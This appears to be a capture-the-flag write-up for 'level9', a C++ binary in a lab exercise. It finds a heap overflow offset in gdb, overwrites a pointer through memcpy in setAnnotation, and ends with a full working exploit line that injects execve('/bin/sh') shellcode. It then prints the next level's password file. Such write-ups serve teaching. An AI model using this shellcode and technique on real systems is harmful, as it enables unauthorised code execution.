# level9

main() 
This binary is written in cpp and there is no calls to /bin/sh, we'll have to use shellcode this time.
We should use the memcpy() on argv[1] in setAnnotation() to make the call to edx and run the shellcode.


## address
setanotation: 
    0804870e

Lets check the offset for buffer overflow.

    $ gdb ./level9
    run 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'
    info register eax  
    eax            0x41366441	1094083649

41366441 -> A6dA

    $ echo 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5' | wc -c
    
> returns 109 including /0 so char count is 108 this is our offset

    gdb: set disassembly-flavor intel
    gdb: disas main
    ...
    0x08048674 <+128>:	mov    DWORD PTR [esp],eax
    0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
    0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]  # This is where we want to inject our code. 
    0x08048680 <+140>:	mov    eax,DWORD PTR [eax]

I want to find the address where it segfaults, so I ltrace with 109 chars

    $ ltrace ./level9 `python -c 'print "A" * 109'`
    ...
    memcpy(0x0804a00c, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 120) = 0x0804a00c

Now that we know this, put address at beginning of buffer.

    gdb: run $(python -c 'print "A" * 108 + "\x0c\xa0\x04\x08"')

Another segfault.
edx has loaded our argument end: 0x41414141 ('AAAA'). It is easy to think about the exploit: let's put a shellcode in order to execute execve("/bin/sh", ["/bin/sh"], NULL) (refers to level2/Ressources). The final exploit is like:

    $ ./level9 `python -c 'print "\x10\xa0\x04\x08" + "\x90"*14 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*69 + "\x0c\xa0\x04\x08"'`
    $ cat /home/user/bonus0/.pass
    f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728


shell code:
http://shell-storm.org/shellcode/files/shellcode-575.html

"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

